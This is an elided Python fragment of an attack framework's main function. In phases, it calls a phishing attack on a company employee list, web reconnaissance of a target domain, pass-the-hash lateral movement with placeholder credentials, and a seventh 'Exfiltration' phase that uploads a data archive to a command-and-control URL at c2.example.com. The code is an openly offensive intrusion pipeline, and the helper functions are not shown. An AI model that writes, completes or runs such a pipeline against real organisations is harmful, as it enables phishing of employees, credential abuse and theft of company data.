...
def main():
    ...
    initial_access.phishing_attack(config.get("target_employees_file", "company_employees.txt"), smtp_config)
    run_tool("apt_web_recon.js", f'--target {config.get("target_domain", "company.com")}')
    ...
    lateral_movement.pass_the_hash(config.get("pass_the_hash_user", "admin"), config.get("pass_the_hash_hash", "hash123"))


    # 7. Exfiltration
    print("\n[*] Phase 7: Exfiltration")
    exfiltration.exfiltrate_data(config.get("exfiltration_data_path", "data/data.zip"), config.get("exfiltration_server_url", "https://c2.example.com/upload"))
